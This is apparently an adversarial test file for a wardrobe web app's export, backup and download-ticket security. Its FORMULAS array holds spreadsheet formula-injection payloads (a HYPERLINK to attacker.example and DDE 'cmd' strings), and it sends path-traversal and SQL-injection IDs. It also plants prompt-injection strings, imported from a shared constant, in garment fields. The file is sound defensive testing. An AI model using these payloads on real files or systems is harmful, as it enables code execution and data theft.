/*
 * THREAT CLASS 8: hostile imports and exports.
 *
 * Everything attacked is the real Worker: the export job and its download tickets, the backup routes,
 * the package importer, local D1, the conversation actor and the local R2 buckets. `real` is the owner's
 * imported profile and inventory (the victim whose package must leak nothing and whose account must never
 * be written); `synthetic` is the LABELLED SYNTHETIC second owner (the attacker, and the source of the
 * small package the import attacks are built from).
 *
 * Stand-ins: test-signed Access assertions; the labelled FAKE MODEL for scripted conversation replies;
 * the Worker package's labelled Google OAuth fixture and remote tool-service fixture (so a stored
 * credential exists); generated test images. A hostile package is built from a real export by changing
 * files and, where the attack calls for it, recomputing the manifest and checksum list as any holder of
 * the package can.
 *
 * Garments whose NAME is a spreadsheet formula cannot start with "SYNTHETIC" (the first character is the
 * attack); they are created with `isSynthetic: true`, a product field that labels them, and only in the
 * synthetic owner's account.
 */
import { SELF } from "cloudflare:test";
import { zipSync } from "fflate";
import { beforeAll, describe, expect, it } from "vitest";
import {
  APP_ORIGIN,
  ApiClient,
  CANARY,
  INJECTIONS,
  MCP_ORIGIN,
  bindings,
  connectGoogle,
  connectMcp,
  createWorld,
  defect,
  enableFakeModel,
  errorOf,
  fingerprint,
  inventory,
  newIdentity,
  outboundLog,
  outboundSeq,
  ownerDay,
  provisionOwner,
  publishBoard,
  runCron,
  seedSynthetic,
  settleRun,
  sha256,
  sql,
  submit,
  testPng,
  toolResult,
  uploadImage,
  SYNTHETIC_WARDROBE,
  type McpConnection,
  type TestOwner,
  type World,
} from "../src/harness.ts";
import { backupPackage, decoder, download, encoder, exportPackage, found, importInto, mediaKeys, openPackage, repack, requestExport, scanDatabase, settleMedia, tableNames, ticketFor, withJson, zipEntries, zipWithBomb, type OpenedPackage } from "../src/data-helpers.ts";

const TAG = crypto.randomUUID().slice(0, 8);
/** Words only this file uses; chosen so that no secret pattern removes them. */
const FORGET_MARKER = `quince heliotrope ${TAG.replace(/[0-9]/g, "x")} marmalade`;
const FORMULAS = [
  `=HYPERLINK("https://attacker.example/${TAG}","x")`,
  `+cmd|' /C calc'!A0`,
  `@SUM(1+1)*cmd|' /C calc'!A0`,
  `-1+1`,
  `\t=1+1`,
  `\r=1+1`,
  `=1+1","=2+2`,
];

let world: World;
let victim: TestOwner;
let attacker: TestOwner;
let victimMcp: McpConnection;
let attackerMcp: McpConnection;
/** The synthetic owner's package: the raw material of the import attacks. */
let base: OpenedPackage & { job: any };
let victimPackage: OpenedPackage & { job: any };
let victimBackup: OpenedPackage & { backup: any };
let secrets: Record<string, string>;
let restrictionId: string;
let restrictedGarmentId: string;
let formulaGarmentIds: string[];
let victimMessageId: string;
let targets = 0;

/** An empty LABELLED SYNTHETIC account to import into (imports are limited per account and hour). */
const freshTarget = (what: string): Promise<TestOwner> => provisionOwner({ displayName: `SYNTHETIC import target ${++targets}: ${what}` });

/** Rows per table that belong to an owner: the widest "was anything written" check there is. */
let ownedTables: string[] | null = null;
async function ownerRows(owner: TestOwner | string, options: { ignore?: string[] } = {}): Promise<Record<string, number>> {
  const userId = typeof owner === "string" ? owner : owner.userId;
  if (!ownedTables) {
    ownedTables = [];
    for (const table of await tableNames()) {
      const columns = await sql<{ name: string }>(`SELECT name FROM pragma_table_info('${table}')`);
      if (columns.some((c) => c.name === "user_id")) ownedTables.push(table);
    }
  }
  const out: Record<string, number> = {};
  for (const table of ownedTables) {
    if (options.ignore?.includes(table)) continue;
    const n = (await sql<{ n: number }>(`SELECT COUNT(*) AS n FROM "${table}" WHERE user_id = ?`, userId))[0]!.n;
    if (n > 0) out[table] = n;
  }
  return out;
}
/** Bookkeeping an import attempt may legitimately leave for the account that made it. */
const ATTEMPT_RECORDS = ["import_jobs", "api_runs", "api_run_events", "account_audit"];

/**
 * Every row of every owned table of an account, as content: a cross-owner attack that rewrites a row without
 * changing the count is caught. Each table is summarised as `<count>:<sha256 of its sorted rows>`, plus the hash of
 * every stored media object of the account.
 */
async function ownerSnapshot(owner: TestOwner | string): Promise<Record<string, string>> {
  const userId = typeof owner === "string" ? owner : owner.userId;
  await ownerRows(userId); // fills ownedTables
  const out: Record<string, string> = {};
  const encode = new TextEncoder();
  for (const table of ownedTables!) {
    const rows = await sql<Record<string, unknown>>(`SELECT * FROM "${table}" WHERE user_id = ?`, userId);
    if (rows.length === 0) continue;
    const lines = rows.map((r) => JSON.stringify(Object.keys(r).sort().map((k) => [k, r[k]]))).sort();
    out[table] = `${rows.length}:${await sha256(encode.encode(lines.join("\n")))}`;
  }
  const objects: string[] = [];
  for (const key of (await mediaKeys(`u/${userId}/`)).sort()) {
    const object = await bindings().MEDIA_BUCKET!.get(key);
    objects.push(`${key}=${object ? await sha256(new Uint8Array(await object.arrayBuffer())) : "missing"}`);
  }
  out["r2:objects"] = `${objects.length}:${await sha256(encode.encode(objects.join("\n")))}`;
  return out;
}
async function settledSnapshot(owner: TestOwner): Promise<Record<string, string>> {
  await quiesce();
  return ownerSnapshot(owner);
}

/**
 * The scheduled sweep starts image searches for every owner and the queue finishes them a little later,
 * each recording a system command. Wait until that background work has drained, so that a comparison of
 * an account before and after an attack is about the attack.
 */
async function quiesce(): Promise<void> {
  let stable = 0;
  let last = -1;
  let pending = -1;
  const readings: number[] = [];
  for (let i = 0; i < 300 && stable < 4; i++) {
    pending = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM media_jobs WHERE state IN ('queued', 'running')"))[0]!.n;
    const commands = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM commands"))[0]!.n;
    stable = pending === 0 && commands === last ? stable + 1 : 0;
    last = commands;
    readings.push(commands);
    await new Promise((resolve) => setTimeout(resolve, 100));
  }
  if (stable >= 4) return;
  // Not settled: a before/after comparison made now would be about background work, not the attack. Fail, and say what is still going on.
  const who = (userId: string): string => (userId === victim?.userId ? "victim" : userId === attacker?.userId ? "attacker" : "another account");
  const jobs = await sql<{ user_id: string; job_id: string; kind: string; state: string; attempts: number; last_error: string | null; updated_at: string }>(
    "SELECT user_id, job_id, kind, state, attempts, last_error, updated_at FROM media_jobs WHERE state IN ('queued', 'running') ORDER BY updated_at LIMIT 20",
  );
  const described = jobs.map((j) => ({ account: who(j.user_id), jobId: j.job_id, kind: j.kind, state: j.state, attempts: j.attempts, lastError: j.last_error?.slice(0, 160) ?? null, updatedAt: j.updated_at }));
  throw new Error(`background work did not settle within 30 seconds: ${pending} media job(s) queued or running; ledger command count, last readings: ${readings.slice(-8).join(", ")}; pending jobs: ${JSON.stringify(described)}`);
}

/** Every row count of an established account, once background work has drained. */
async function settledRows(owner: TestOwner): Promise<Record<string, number>> {
  await quiesce();
  return ownerRows(owner);
}

async function expectRejected(response: Response, what: string): Promise<void> {
  const text = await response.text();
  expect(response.status, `${what}: ${text.slice(0, 200)}`).toBe(400);
  const body = JSON.parse(text);
  expect(body.error.code, what).toBe("invalid_command");
  expect(body.error.message, what).not.toBe("");
  expect(text, what).not.toMatch(/SQLITE|D1_ERROR|\bat [A-Za-z.]+ \(|\.ts:\d+/);
}

function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i]!;
    if (quoted) {
      if (ch === '"') {
        if (text[i + 1] === '"') {
          cell += '"';
          i++;
        } else quoted = false;
      } else cell += ch;
    } else if (ch === '"') quoted = true;
    else if (ch === ",") {
      row.push(cell);
      cell = "";
    } else if (ch === "\n" || (ch === "\r" && text[i + 1] === "\n")) {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
      if (ch === "\r") i++;
    } else cell += ch;
  }
  if (cell !== "" || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}

/** Cells of every CSV view of a package that a spreadsheet would run as a formula. */
function liveFormulaCells(pkg: OpenedPackage): string[] {
  const live: string[] = [];
  for (const path of Object.keys(pkg.files).filter((p) => p.endsWith(".csv"))) {
    for (const row of parseCsv(pkg.text(path))) for (const cell of row) if (/^[=+\-@\t\r]/.test(cell)) live.push(`${path}: ${JSON.stringify(cell.slice(0, 60))}`);
  }
  return live;
}

/** A table dump in the package's own shape, built from real rows of an owner (or one made-up row). */
async function dumpOf(table: string, userId: string, change: (row: Record<string, any>) => void = () => undefined): Promise<{ description: string; columns: string[]; rows: Record<string, any>[] }> {
  const columns = (await sql<{ name: string }>(`SELECT name FROM pragma_table_info('${table}')`)).map((c) => c.name);
  let rows = columns.includes("user_id") ? await sql<Record<string, any>>(`SELECT * FROM "${table}" WHERE user_id = ?`, userId) : [];
  if (rows.length === 0) rows = [Object.fromEntries(columns.map((c) => [c, `planted-${TAG}`]))];
  rows = rows.map((r) => ({ ...r }));
  rows.forEach(change);
  return { description: "planted by the adversarial suite", columns, rows };
}

beforeAll(async () => {
  world = await createWorld();
  victim = world.real;
  attacker = world.synthetic;

  /* ---- the attacker's own (SYNTHETIC) account: hostile cells, an active restriction, a little history ---- */
  formulaGarmentIds = [];
  for (const [index, formula] of FORMULAS.entries()) {
    const named = await submit(attacker, "garment.create", { name: formula, category: "scarf", roles: ["accessory"], careChannel: "none", acquisition: "owned", quantity: 1, isSynthetic: true, product: `SYNTHETIC test garment ${index} (its name is a spreadsheet formula on purpose)`, attributes: { accessoryKind: "scarf" }, source: { kind: "system", note: "synthetic adversarial fixture" } });
    expect(named.status, JSON.stringify(named.error)).toBe(200);
    formulaGarmentIds.push(named.receipt.result.garmentId);
    const carried = await submit(attacker, "garment.create", { name: `SYNTHETIC formula carrier ${index} ${TAG}`, category: "scarf", roles: ["accessory"], careChannel: "none", acquisition: "owned", quantity: 1, isSynthetic: true, maker: formula, product: formula, colour: formula, pattern: formula, fabric: formula, size: formula, attributes: { accessoryKind: "scarf" }, source: { kind: "system", note: formula } });
    expect(carried.status, JSON.stringify(carried.error)).toBe(200);
  }
  const injected = await submit(attacker, "garment.create", { name: `SYNTHETIC ${INJECTIONS.liftRestriction}`, category: "scarf", roles: ["accessory"], careChannel: "none", acquisition: "owned", quantity: 1, isSynthetic: true, product: INJECTIONS.createGarment, seasonNote: INJECTIONS.exfiltrate, attributes: { accessoryKind: "scarf" }, source: { kind: "system", note: INJECTIONS.amendProfile } });
  expect(injected.status, JSON.stringify(injected.error)).toBe(200);
  const wore = await submit(attacker, "wear.record", { wearingDate: await ownerDay(attacker, 0), garmentIds: [formulaGarmentIds[0]!] });
  expect(wore.status, JSON.stringify(wore.error)).toBe(200);
  restrictedGarmentId = SYNTHETIC_WARDROBE.find((g) => g.roles.includes("footwear"))?.id ?? SYNTHETIC_WARDROBE[0]!.id;
  const restricted = await submit(attacker, "restriction.add", { kind: "other", scope: { garmentIds: [restrictedGarmentId] }, reason: "SYNTHETIC restriction that an import must not lift", requiredEvidence: "owner_statement", source: { kind: "owner_statement", note: "synthetic adversarial fixture" } });
  expect(restricted.status, JSON.stringify(restricted.error)).toBe(200);
  restrictionId = restricted.receipt.result.restrictionId;
  const note = await submit(attacker, "research.save_note", { topic: `SYNTHETIC research note ${TAG}`, body: "SYNTHETIC note body: a record of the assistant's module, so a package carries more than the ledger.", claims: [], garmentIds: [], productIds: [] });
  expect(note.status, JSON.stringify(note.error)).toBe(200);
  const attackerModel = await enableFakeModel(attacker);
  attackerModel.script({ text: "SCRIPTED FAKE MODEL REPLY: noted (synthetic owner)." });
  const attackerTurn = await attacker.api.json("POST", "/v1/conversation/turns", { clientTurnId: `adv08-a-${crypto.randomUUID()}`, text: `SYNTHETIC conversation line ${TAG} of the synthetic owner.` });
  await settleRun(attacker, attackerTurn.runId);
  const attackerPhoto = await uploadImage(attacker, { garmentId: SYNTHETIC_WARDROBE[0]!.id, bytes: testPng(112, 112) });
  await settleMedia(attacker, attackerPhoto.complete.asset.assetId);
  attackerMcp = await connectMcp(attacker, { write: true, clientName: "Attacker assistant (synthetic owner)" });
  base = await exportPackage(attacker);

  /* ---- the victim (the real owner's data): everything a package must not carry ---- */
  const connectionSecret = `tvly-ADV08CONN${TAG}-0123456789abcdef`;
  const registered = await victim.api.json("POST", "/v1/connections", { clientRequestId: `adv08-conn-${crypto.randomUUID()}`, kind: "tavily", name: "Page search (adversarial fixture key)", auth: { type: "secret", secret: connectionSecret } });
  expect(registered.connection.state).toBe("connected");
  await connectGoogle(victim, ["gmail.read_orders", "calendar.read", "calendar.write_outfit_calendar"]);
  victimMcp = await connectMcp(victim, { write: true, clientName: "Owner's assistant (adversarial export test)" });
  const deviceToken = Array.from(crypto.getRandomValues(new Uint8Array(32)), (b) => b.toString(16).padStart(2, "0")).join("");
  await victim.api.json("POST", "/v1/devices", { deviceId: `adv08-device-${TAG}`, token: deviceToken, environment: "development" });
  const model = await enableFakeModel(victim);
  model.script({ text: "SCRIPTED FAKE MODEL REPLY: I will not repeat credentials." });
  const turn = await victim.api.json("POST", "/v1/conversation/turns", { clientTurnId: `adv08-v-${crypto.randomUUID()}`, text: `For the tailor's portal my api key is ${CANARY.apiKey}, the header is ${CANARY.bearer}, password: ${CANARY.password} and the Google token ${CANARY.googleToken}.` });
  await settleRun(victim, turn.runId);
  victimMessageId = ((await victim.api.json("GET", "/v1/conversation/messages")).messages as any[]).find((m) => m.role === "user").messageId;
  const top = (await inventory(victim)).items.find((i) => i.garment.acquisition === "owned" && i.garment.roles.includes("top"))!;
  const photo = await uploadImage(victim, { garmentId: top.garment.garmentId, bytes: testPng(104, 104) });
  await settleMedia(victim, photo.complete.asset.assetId);
  victimPackage = await exportPackage(victim);
  victimBackup = await backupPackage(victim);

  const env = bindings() as unknown as Record<string, string>;
  const tokens = victimMcp.oauth.snapshot();
  const code = victim.recoveryKit.recoveryCode;
  secrets = {
    "recovery code": code,
    "recovery code (digits only)": code.split("-").slice(2).join(""),
    "sign-in subject": victim.identity.subject,
    "sign-in email": victim.identity.email ?? "",
    "assistant access token": tokens.accessToken,
    "assistant refresh token": tokens.refreshToken ?? "",
    "connection key": connectionSecret,
    "connection key (body)": `ADV08CONN${TAG}`,
    "device push token": deviceToken,
    "canary api key": CANARY.apiKey,
    "canary bearer": CANARY.bearer.replace(/^Bearer\s+/, ""),
    "canary password": CANARY.password,
    "canary google token": CANARY.googleToken,
    "media signing key": env.MEDIA_SIGNING_KEY!,
    "state signing key": env.STATE_SIGNING_KEY!,
    "credential encryption key": env.CREDENTIAL_KEY!,
    "Google OAuth client secret": env.GOOGLE_OAUTH_CLIENT_SECRET!,
    "Access signing key (private exponent)": JSON.parse(env.TEST_ACCESS_PRIVATE_JWK!).d,
    "push provider key": env.APNS_PRIVATE_KEY!.split("\n").filter((l) => l && !l.startsWith("-----"))[1] ?? "",
    "media storage prefix": `u/${victim.userId}/`,
    "export storage prefix": `exports/${victim.userId}`,
    "backup storage prefix": `backups/${victim.userId}`,
    "another owner's ID": attacker.userId,
    "another owner's sign-in subject": attacker.identity.subject,
    "another owner's garment": `SYNTHETIC formula carrier 0 ${TAG}`,
    "another owner's conversation": `SYNTHETIC conversation line ${TAG}`,
  };
  for (const row of await sql<Record<string, unknown>>("SELECT * FROM connection_credentials WHERE user_id = ?", victim.userId)) {
    for (const [column, value] of Object.entries(row)) if (typeof value === "string" && value.length >= 24 && !["user_id", "connection_id"].includes(column) && !/^\d{4}-\d\d-\d\dT/.test(value)) secrets[`stored credential ${column} of ${String(row.connection_id).slice(0, 12)}`] = value;
  }
});

/* ================================================================== */
/* Exports                                                              */
/* ================================================================== */

describe("exports: what a package is", () => {
  it("fixture: both owners have a finished package, and the victim's holds the real wardrobe", async () => {
    expect(victimPackage.job.state).toBe("completed");
    expect(base.job.state).toBe("completed");
    expect(victimPackage.json("records/inventory.json").tables.garments.rows.length).toBe((await inventory(victim)).total);
    expect(Object.keys(victimPackage.files).some((p) => p.startsWith("media/"))).toBe(true);
    expect(victimBackup.backup.backupId).toMatch(/^bkp_/);
    expect(Object.keys(secrets).filter((label) => secrets[label] === "")).toEqual([]);
    // The credentials this file hunts for really are stored for the victim (encrypted), so their absence below means something.
    expect((await sql("SELECT COUNT(*) AS n FROM connection_credentials WHERE user_id = ? AND ciphertext IS NOT NULL", victim.userId))[0]!.n).toBeGreaterThanOrEqual(2);
    expect((await sql("SELECT COUNT(*) AS n FROM mcp_grants WHERE user_id = ? AND status = 'active'", victim.userId))[0]!.n).toBe(1);
  });

  it("every checksum in the manifest verifies, nothing is unlisted, and the checksum list agrees (export and backup)", async () => {
    for (const [what, pkg] of [["export", victimPackage], ["backup", victimBackup], ["synthetic export", base]] as const) {
      expect(pkg.manifest.format, what).toBe("garderobe-export/1");
      expect(pkg.manifest.files.length, what).toBeGreaterThan(15);
      for (const entry of pkg.manifest.files) {
        expect(pkg.files[entry.path], `${what}: ${entry.path}`).toBeTruthy();
        expect(pkg.files[entry.path]!.length, `${what}: ${entry.path}`).toBe(entry.bytes);
        expect(await sha256(pkg.files[entry.path]!), `${what}: ${entry.path}`).toBe(entry.sha256);
      }
      const listed = new Set<string>(pkg.manifest.files.map((f: any) => f.path));
      for (const path of Object.keys(pkg.files)) if (path !== "manifest.json" && path !== "checksums.sha256") expect(listed.has(path), `${what}: ${path} is not in the manifest`).toBe(true);
      const lines = pkg.text("checksums.sha256").trim().split("\n");
      expect(lines.length, what).toBe(pkg.manifest.files.length + 1);
      for (const line of lines) {
        const match = /^([0-9a-f]{64}) {2}(.+)$/.exec(line)!;
        expect(await sha256(pkg.files[match[2]!]!), `${what}: ${match[2]}`).toBe(match[1]);
      }
    }
    // The job describes exactly the bytes that were downloaded.
    expect(await sha256(victimPackage.zip)).toBe(victimPackage.job.sha256);
    expect(victimPackage.zip.length).toBe(victimPackage.job.byteLength);
    expect(await sha256(victimBackup.zip)).toBe(victimBackup.backup.sha256);
  });

  it("the export and the backup carry no credential, token, recovery code, signing key, storage location or anything of another owner", async () => {
    for (const [what, pkg] of [["export", victimPackage], ["backup", victimBackup]] as const) {
      const text = pkg.allText();
      expect(found(text, secrets), `${what} contains`).toEqual([]);
      expect(found(Object.keys(pkg.files).join("\n"), secrets), `${what} file names contain`).toEqual([]);
      // Field names that only a credential record has.
      const fields = [...new Set([...text.matchAll(/"(access_token|refresh_token|id_token|token_hash|ticket_hash|verifier|salt|ciphertext|nonce|client_secret|recovery_code|password|secret_ref|secret|private_key|object_key)"\s*:/g)].map((m) => m[1]))];
      expect(fields, `${what} has credential-shaped fields`).toEqual([]);
      expect(text, what).not.toMatch(/fixture-(?:oauth-)?(?:access|refresh)/); // the Google and OAuth fixtures' token values
      expect(text, what).not.toMatch(/ya29\.[A-Za-z0-9._-]{10,}/);
      expect(text, what).not.toMatch(/-----BEGIN [A-Z ]*PRIVATE KEY-----/);
      expect(text, what).not.toMatch(/\bu\/usr_[0-9a-f]+\//); // any owner's storage prefix
      // Tables that are never exported do not appear under any component.
      for (const path of Object.keys(pkg.files).filter((p) => p.startsWith("records/"))) {
        const tables = Object.keys(pkg.json(path).tables ?? {});
        for (const forbidden of ["recovery_credentials", "recovery_transactions", "auth_identities", "auth_session_floors", "connection_credentials", "connection_oauth_states", "owner_invitations", "identity_link_tickets", "export_tickets", "mcp_grants", "notification_devices", "account_deletions", "submitted_proposals", "proposal_claims", "users"]) expect(tables, `${what} ${path}`).not.toContain(forbidden);
        // The owner's decisions on assistant requests travel (API thread ruling, 2026-10-12: a decided request is not offered
        // again after a restore), but only as the decision record: ids, type, decision, time and channel, no text, no credential.
        const decisions = pkg.json(path).tables?.proposal_decisions;
        if (decisions) {
          const allowed = ["user_id", "proposal_id", "turn_id", "command_type", "decision", "command_id", "decided_at", "channel"];
          const columns: string[] = decisions.columns ?? Object.keys(decisions.rows?.[0] ?? {});
          expect(columns.filter((c) => !allowed.includes(c)), `${what} ${path} proposal_decisions columns`).toEqual([]);
          for (const row of decisions.rows ?? []) if (row && typeof row === "object" && "user_id" in row) expect(row.user_id, `${what} ${path} proposal_decisions owner`).toBe(victim.userId);
        }
      }
      // The media files are the victim's own images and nothing else.
      const mediaFiles = Object.keys(pkg.files).filter((p) => p.startsWith("media/"));
      const own = new Set((await sql<{ sha256: string }>("SELECT sha256 FROM media_renditions WHERE user_id = ?", victim.userId)).map((r) => r.sha256));
      for (const path of mediaFiles) expect(own.has(await sha256(pkg.files[path]!)), `${what}: ${path}`).toBe(true);
    }
    // The connection is listed for information, without anything that could use it.
    const account = victimPackage.json("records/account.json");
    expect(account.connections.length).toBeGreaterThanOrEqual(2);
    expect(account.connectedAssistants).toHaveLength(1);
    // The conversation is in the package with the pasted credentials already removed.
    expect(victimPackage.text("records/conversation.json")).toContain("tailor's portal");
  });

  it("CSV views neutralise formula cells: nothing a spreadsheet would execute, in any column of any view", async () => {
    expect(liveFormulaCells(base)).toEqual([]);
    expect(liveFormulaCells(victimPackage)).toEqual([]);
    // The hostile values are really there, as text.
    const inventoryRows = parseCsv(base.text("views/inventory.csv"));
    const header = inventoryRows[0]!;
    const column = (name: string) => header.indexOf(name);
    for (const [index, formula] of FORMULAS.entries()) {
      const named = inventoryRows.find((r) => r[column("garment_id")] === formulaGarmentIds[index])!;
      expect(named, `formula ${index} is in the inventory view`).toBeTruthy();
      expect(named[column("name")], `formula ${index}`).toBe(`'${formula}`);
      expect(named.length, `formula ${index} did not break the row into more cells`).toBe(header.length);
      const carrier = inventoryRows.find((r) => r[column("name")] === `SYNTHETIC formula carrier ${index} ${TAG}`)!;
      for (const field of ["maker", "product", "colour", "pattern", "fabric", "size"]) expect(carrier[column(field)], `${field} of carrier ${index}`).toBe(`'${formula}`);
    }
    // The garment name also travels into the wear and movement views.
    expect(parseCsv(base.text("views/wear-history.csv")).some((r) => r.includes(`'${FORMULAS[0]}`))).toBe(true);
    expect(parseCsv(base.text("views/quantity-movements.csv")).some((r) => r.includes(`'${FORMULAS[0]}`))).toBe(true);
    // The records keep the owner's words exactly (the neutralisation is in the spreadsheet views only).
    expect(base.json("records/inventory.json").tables.garments.rows.map((g: any) => g.name)).toEqual(expect.arrayContaining(FORMULAS));
  });

  it("an encrypted export is unreadable without its passphrase, detects tampering, and the passphrase is stored nowhere", async () => {
    const passphrase = `adv08 passphrase ${TAG} with spaces`;
    expect((await attacker.api.post("/v1/exports", { clientRequestId: `adv08-short-${crypto.randomUUID()}`, passphrase: "short" })).status).toBe(400);
    const job = await requestExport(attacker, { passphrase });
    expect(job.state).toBe("completed");
    expect(job.encrypted).toBe(true);
    const sealed = new Uint8Array(await (await download((await ticketFor(attacker, job.exportId)).url)).arrayBuffer());
    const asText = decoder.decode(sealed);
    for (const plain of ["garment_id", "manifest.json", "SYNTHETIC", attacker.userId, "PK\u0003\u0004"]) expect(asText.includes(plain), plain).toBe(false);
    expect((await scanDatabase({ passphrase })).map((h) => `${h.table}.${h.column}`)).toEqual([]);

    const target = await freshTarget("encrypted package");
    const before = await ownerRows(target);
    const none = await importInto(target, sealed, { "Content-Type": "application/octet-stream" });
    expect(none.status).toBe(400);
    expect((await errorOf(none)).details.reason).toBe("passphrase_required");
    const wrong = await importInto(target, sealed, { "Content-Type": "application/octet-stream", "X-Garderobe-Passphrase": `${passphrase}!` });
    expect(wrong.status).toBe(400);
    const flipped = sealed.slice();
    flipped[Math.floor(flipped.length / 2)]! ^= 0x01;
    const tampered = await importInto(target, flipped, { "Content-Type": "application/octet-stream", "X-Garderobe-Passphrase": passphrase });
    expect(tampered.status).toBe(400);
    const truncated = await importInto(target, sealed.subarray(0, sealed.length - 64), { "Content-Type": "application/octet-stream", "X-Garderobe-Passphrase": passphrase });
    expect(truncated.status).toBe(400);
    expect(await ownerRows(target)).toEqual(before);
    // With the passphrase it is the same wardrobe.
    const opened = await importInto(target, sealed, { "Content-Type": "application/octet-stream", "X-Garderobe-Passphrase": passphrase });
    expect(opened.status).toBe(200);
    expect(((await opened.json()) as any).state).toBe("completed");
    expect((await inventory(target)).total).toBe((await inventory(attacker)).total);
    expect((await scanDatabase({ passphrase })).map((h) => `${h.table}.${h.column}`)).toEqual([]);
  });

  it("a forgotten message is absent from a later export and a later backup", async () => {
    const model = await enableFakeModel(victim);
    model.script({ text: `SCRIPTED FAKE MODEL REPLY: I have noted ${FORGET_MARKER}.` });
    const turn = await victim.api.json("POST", "/v1/conversation/turns", { clientTurnId: `adv08-forget-${crypto.randomUUID()}`, text: `Something private I will want forgotten: ${FORGET_MARKER}.` });
    await settleRun(victim, turn.runId);
    const before = await exportPackage(victim);
    expect(before.allText()).toContain(FORGET_MARKER); // it was really there

    const messages = (await victim.api.json("GET", "/v1/conversation/messages")).messages as any[];
    const said = messages.find((m) => m.role === "user" && m.text.includes(FORGET_MARKER));
    const forgot = await submit(victim, "conversation.forget_source", { sourceKind: "message", sourceIds: [said.messageId] });
    expect(forgot.status, JSON.stringify(forgot.error)).toBe(200);

    expect(JSON.stringify(await victim.api.json("GET", "/v1/conversation/messages"))).not.toContain(FORGET_MARKER);
    const laterExport = await exportPackage(victim);
    const laterBackup = await backupPackage(victim);
    for (const [what, pkg] of [["export", laterExport], ["backup", laterBackup]] as const) {
      const hits = Object.entries(pkg.files).filter(([path, bytes]) => !path.startsWith("media/") && decoder.decode(bytes).includes(FORGET_MARKER)).map(([path]) => path);
      expect(hits, `${what} still carries the forgotten words in`).toEqual([]);
    }
    // The tombstone travels with the backups, so an older backup cannot bring the message back.
    const journal = await victim.api.json("GET", "/v1/backups/tombstones");
    expect(journal.tombstones.map((t: any) => t.sourceId)).toContain(said.messageId);
    expect(JSON.stringify(journal)).not.toContain(FORGET_MARKER);
  });
});

describe("exports: who may have a package", () => {
  it("another owner's export and backup IDs answer 404 on every route, and appear in no list", async () => {
    const exportId = victimPackage.job.exportId as string;
    const backupId = victimBackup.backup.backupId as string;
    const missing = await attacker.api.get("/v1/exports/exp_AAAAAAAAAAAAAAAA");
    const missingBody = await missing.text();
    expect(missing.status).toBe(404);
    for (const [method, path] of [
      ["GET", `/v1/exports/${exportId}`],
      ["POST", `/v1/exports/${exportId}/ticket`],
      ["POST", `/v1/backups/${backupId}/ticket`],
      ["GET", `/v1/exports/${backupId}`],
      ["POST", `/v1/exports/${backupId}/ticket`],
      ["GET", `/v1/imports/${exportId}`],
      ["GET", `/v1/runs/${victimPackage.job.runId}`],
      ["GET", `/v1/runs/${victimBackup.backup.runId}`],
    ] as const) {
      const response = await attacker.api.request(method, path, method === "POST" ? { body: {} } : {});
      const text = await response.text();
      expect(response.status, `${method} ${path}`).toBe(404);
      expect(text).not.toContain("ticket=");
      expect(text).not.toContain(victim.userId);
      if (path === `/v1/exports/${exportId}`) expect(text).toBe(missingBody);
    }
    expect(JSON.stringify(await attacker.api.json("GET", "/v1/exports"))).not.toContain(exportId);
    expect(JSON.stringify(await attacker.api.json("GET", "/v1/backups"))).not.toContain(backupId);
    // A backup is not downloadable through the export ticket route's ID check either way round, even for its owner.
    expect((await victim.api.post(`/v1/backups/${exportId}/ticket`, {})).status).toBe(404);
    // Odd IDs are not found, never an error.
    for (const id of ["..%2F..%2Fexports", "%00", encodeURIComponent(`${exportId}' OR '1'='1`), encodeURIComponent(`${victim.userId}/${exportId}`), "A".repeat(3000)]) {
      for (const path of [`/v1/exports/${id}`, `/v1/imports/${id}`]) {
        const response = await attacker.api.get(path);
        expect(response.status, path.slice(0, 80)).toBe(404);
        expect(await response.text()).not.toMatch(/SQLITE|D1_ERROR/);
      }
    }
  });

  it("a download ticket is unguessable, short-lived, single-use, bound to one export and stored only as a hash", async () => {
    const exportId = victimPackage.job.exportId as string;
    const first = await ticketFor(victim, exportId);
    const second = await ticketFor(victim, exportId);
    const value = (t: { url: string }) => new URL(`${APP_ORIGIN}${t.url}`).searchParams.get("ticket")!;
    expect(value(first)).not.toBe(value(second));
    expect(value(first).length).toBeGreaterThanOrEqual(32);
    expect(new Set(value(first)).size).toBeGreaterThan(12); // not a counter or a timestamp
    expect(value(first)).not.toContain(exportId);
    expect(Date.parse(first.expiresAt) - Date.now()).toBeLessThanOrEqual(5 * 60_000);
    expect(Date.parse(first.expiresAt)).toBeGreaterThan(Date.now());
    expect((await scanDatabase({ ticket: value(first), "second ticket": value(second) })).map((h) => `${h.table}.${h.column}`)).toEqual([]);

    const path = `/v1/exports/${exportId}/download`;
    // Without a ticket, with a session instead of a ticket, with a wrong or altered ticket: nothing.
    for (const [what, response] of [
      ["no ticket", await SELF.fetch(`${APP_ORIGIN}${path}`)],
      ["an empty ticket", await SELF.fetch(`${APP_ORIGIN}${path}?ticket=`)],
      ["the owner's session and no ticket", await victim.api.get(path)],
      ["the owner's session and a wrong ticket", await victim.api.get(`${path}?ticket=wrong`)],
      ["a made-up ticket", await SELF.fetch(`${APP_ORIGIN}${path}?ticket=${"A".repeat(value(first).length)}`)],
      ["a ticket with one character changed", await SELF.fetch(`${APP_ORIGIN}${path}?ticket=${value(first).slice(0, -1)}${value(first).endsWith("A") ? "B" : "A"}`)],
      ["a truncated ticket", await SELF.fetch(`${APP_ORIGIN}${path}?ticket=${value(first).slice(0, 20)}`)],
      ["the ticket hash's own namespace", await SELF.fetch(`${APP_ORIGIN}${path}?ticket=export-ticket`)],
    ] as const) {
      expect([400, 401], `${what} -> ${response.status}`).toContain(response.status);
      expect(response.headers.get("content-type") ?? "", what).not.toMatch(/zip|octet-stream/);
      await response.arrayBuffer();
    }
    // The attacker's own genuine ticket is for the attacker's export: it opens nothing of the victim's.
    const theirs = await ticketFor(attacker, base.job.exportId);
    const crossed = await SELF.fetch(`${APP_ORIGIN}${path}?ticket=${value(theirs)}`);
    expect(crossed.status).toBe(401);
    // And the victim's ticket does not open the attacker's export ID.
    expect((await SELF.fetch(`${APP_ORIGIN}/v1/exports/${base.job.exportId}/download?ticket=${value(first)}`)).status).toBe(401);
    // A ticket for the export does not download the backup, and the other way round.
    expect((await SELF.fetch(`${APP_ORIGIN}/v1/exports/${victimBackup.backup.backupId}/download?ticket=${value(first)}`)).status).toBe(401);

